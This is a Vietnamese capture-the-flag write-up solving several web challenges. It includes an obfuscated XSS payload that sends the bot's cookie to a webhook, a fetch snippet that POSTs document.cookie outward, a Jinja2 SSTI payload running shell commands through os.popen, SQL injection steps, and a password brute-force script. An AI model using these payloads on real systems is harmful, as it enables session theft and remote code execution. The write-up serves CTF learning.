# Spinner

Source code js của chall này nằm ngay trong web
![image](https://hackmd.io/_uploads/HJwiSmmV0.png)

Để ý thấy khi spins đủ 10,000 vòng thì flag sẽ hiện ra =)) Bài warm ups rất hay. Ở đây mình chỉ cần ghi hai lệnh trong if kia để lấy flag trong console.

![image](https://hackmd.io/_uploads/H1VXIX7N0.png)
Flag: `actf{b152d497db04fcb1fdf6f3bb64522d5e}`


# Markdown 
Để ý thấy có 2 link, link đầu tiên cho mình ghi text và in ra màn hình, link thứ 2 là 1 con bot sẽ visit link của mình. Chắc chắn đây là 1 bài XSS. 

![image](https://hackmd.io/_uploads/r1bQDQ7ER.png)
Khi gửi token vào /flag ta sẽ có được flag. Vì vậy, ta cần XSS steal cookie của con bot này. Test với link đầu tiên.

Ở đây web sử dụng markdown gì đấy nên có vẻ 1 số loại thẻ sẽ không được nhận. Mình luôn thử thẻ script đầu tiên và không có điều gì xảy ra. Nó bị xóa luôn khỏi HTML
![image](https://hackmd.io/_uploads/S1UqPQ7NA.png)

Inject 1 thẻ img và thành công. `<img src=x onerror=alert(1)>`
![image](https://hackmd.io/_uploads/rJkRD7XVC.png)

Nhưng khi mình chèn link web hook vào thì nó lại bị tách thành 1 thẻ a mới khiến XSS không thành công. 
![image](https://hackmd.io/_uploads/H1GSOQm4A.png)

Mình nghĩ đến biến hàm fetch đến webhook thành base64 rồi eval(atob) nó. 
![image](https://hackmd.io/_uploads/BJagK7m4C.png)

Tiếp tục không nhận. Thử tiếp hàm String.fromCharCode xem
Thành công request đến webhook của mình.
![image](https://hackmd.io/_uploads/SkJFKm7EA.png)

`<img src=x onerror=eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,57,52,49,99,100,53,56,50,45,97,51,50,53,45,52,57,51,98,45,57,97,49,56,45,49,55,49,97,97,54,57,49,57,53,98,52,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))>`


Gửi đến con bot thôi. Gửi đến con bot thì không có gì xảy ra. Có vẻ như đã bị CSP chặn. Hàm fetch bình thường sẽ không được, cho nên mình sẽ sử dụng hàm fetch được nâng cấp thêm
```
fetch('<URL muốn gửi đến>', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
```

Chỉnh sửa lại payload, gửi đến con bot ta được token và request đến /flag thoai
![image](https://hackmd.io/_uploads/rJ99cQmVC.png)

Hể we go 
![image](https://hackmd.io/_uploads/rk6xomQNR.png)
Flag: `actf{b534186fa8b28780b1fcd1e95e2a2e2c}`

# Winds
Challenge này là 1 chall SSTI jinja2, do có sink là hàm render_template_string cùng với source do mình kiểm soát (jumbled). Nhưng nó sẽ bị suffle như bên dưới. 
![image](https://hackmd.io/_uploads/HkuUiQ7EC.png)


Ở đây, mình sẽ có đoạn script như sau: 
```python=
import random

def suf(text):
    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    return ''.join(jumbled)

def desuf(payload):
    random.seed(0)
    indices = list(range(len(payload)))
    random.shuffle(indices)
    original_input = [''] * len(payload)
    for i, index in enumerate(indices):
        original_input[index] = payload[i]
    return ''.join(original_input)
```

Đại khái thì đoạn code sẽ làm như sau. Đầu tiên nó tạo 1 list chứa các số từ 0 đến length(payload) - 1. Sau đó suffle với seed 0 như web sẽ làm. Sau đó, mình sẽ sắp xếp lại payload sao cho số trong mảng indices kia là index trong string của payload. Khi đó, payload được sắp xếp sẽ đi qua lại hàm suffle của web và thành payload hoàn chỉnh chạy được. 

Tìm đại 1 payload RCE để đọc flag. 

```python=
payload = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"

print(desuf(payload))
print(suf(desuf(payload)))
#Payload: bft_. rs{'n gll_exte_i_{e_.'._enl)cltoeapl(ec.lee}.ap}Tootscnrdmt(f_f_ra_y)ie taacce.tReps._n_.ogx
#Payload sau khi đi qua hàm seed của web sẽ được sắp xếp lại đúng: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
```

![image](https://hackmd.io/_uploads/B1SxpQmEA.png)
Flag: `actf{2cb542c944f737b85c6bb9183b7f2ea8}`

# Store
![image](https://hackmd.io/_uploads/HJMLTQm4C.png)
Preview của bài này khiến mình đoán được đây là 1 chall về SQLi
![image](https://hackmd.io/_uploads/HkxFpQ74A.png)
Trong source của web có đoạn script sau. Nghĩa là nó chặn các kĩ tự khác ngoài [a-zA-Z0-9, ]

Khi đó mình sẽ nhập payload trong BurpSuite để không bị đoạn script chặn
![image](https://hackmd.io/_uploads/SyUeRmQNR.png)

Mình sẽ detect số cột cùng với kiểu dữ liệu từng cột trước khi detect DB.
Nó có 3 cột và thứ tự sẽ là int, varchar, varchar.
![image](https://hackmd.io/_uploads/BJEFCm7NA.png)

(Mình lúc đầu thử select null,null,null nhưng lại bị lỗi. Tưởng payload lỗi nên thử nhiều payload khác... May có hint của anh Thắng)

DB sử dụng loại SQLite
![image](https://hackmd.io/_uploads/r1v0AXQ4R.png)

Extract DB structure
![image](https://hackmd.io/_uploads/By9Mk4QE0.png)

Extract Flag
![image](https://hackmd.io/_uploads/rJMr14mNA.png)
Flag: `actf{37619bbd0b81c257b70013fa1572f4ed}`

# Store

Bài web này có 2 điều đáng chú ý như sau
```python=
ADMIN_PASSWORD = hashlib.md5(
    f'password-{secrets.token_hex}'.encode()
).hexdigest()

pastes = {}

def add_paste(paste_id, content, admin_only=False):
    pastes[paste_id] = {
        'content': content,
        'admin_only': admin_only,
    }
```

![image](https://hackmd.io/_uploads/BJU1g4XVR.png)

ADMIN_PASSWORD là password được hash md5 với hàm secrets.token_hex.
/paste sẽ tạo ra 1 cái kiểu như log, với hàm id sẽ tạo ra paste_id để ta truy cập vào.

Khi mình truy cập vào id=0 và nhập password đúng sẽ có được flag
`add_paste(0, os.getenv('FLAG', 'missing flag'), admin_only=True)`

Ở đây sẽ cần 1 sự tinh mắt và tư duy nhất định. 
1. Để ý ở trên `secrets.token_hex` chưa được gọi (cần thêm dấu `()`) cho nên nó chỉ là địa chỉ của hàm này. 
2. Thứ hai, hàm id ở dưới sẽ gọi ra địa chỉ của biến paste được tạo kia và gán thành id của nó luôn. 

Kết hợp 2 điều này lại, secrets.token_hex được khai báo trước cho nên sẽ có địa chỉ nhỏ hơn các biến paste kia. Vì vậy, tạo bừa 1 log để lấy được id và trừ dần để bruteforce password với 6 chữ cái đầu là `1797c2` (Khi truy cập vào id=0 sẽ lấy được). 

Ở đây mình có đoạn script sau:
```python=
from hashlib import md5
from tqdm import trange


def crack_password(pass_start, id):
    for i in trange(256**3):
        for j in range(0, 256, 16):
            str = f"password-<function token_hex at {id}{i:x}{j:x}>"
            hash = md5(str.encode()).hexdigest()
            if hash.startswith(pass_start):
                print(f"Potential password: {hash}")
                
id = 135598316332944
id = hex(int(id))[:6]
crack_password("1797c2", id)
```

Script sẽ tạo ra từng password có tiềm năng và mình nhập vào để check.
Password đúng sẽ là `1797c2a48f270a2b42660c2e629c51cd`
![image](https://hackmd.io/_uploads/HyDbzEXNC.png)

Flag: `actf{47fd1d17b0c1121da0fc9d2d0c4fc109}`

P/s: script lượm trên discord chứ cũng không tự viết được.

Script của người ta:

```python=
import requests
from hashlib import md5
from tqdm import trange

url = "https://pastebin.web.actf.co"

def crack_password(pass_start, id):
    for i in trange(256**3):
        for j in range(0, 256, 16):
            str = f"password-<function token_hex at {id}{i:x}{j:x}>"
            hash = md5(str.encode()).hexdigest()
            if hash.startswith(pass_start):
                print(f"Potential password: {hash}")
                response = requests.get(f"{url}/view?id=0&password={hash}")
                if "Incorrect" not in response.text:
                    print(response.text)
                    return

if __name__ == "__main__":
    # Get id
    response = requests.post(f"{url}/paste", data={"content": "nils"})
    id = response.text.split("id=")[1].split('"')[0]
    id = hex(int(id))[:6]
    # Get admin password[:6]
    response = requests.get(f"{url}/view?id=0")
    pass_start = response.text.split("=")[1].split(".")[0]
    # Crack pass
    crack_password(pass_start, id)
```


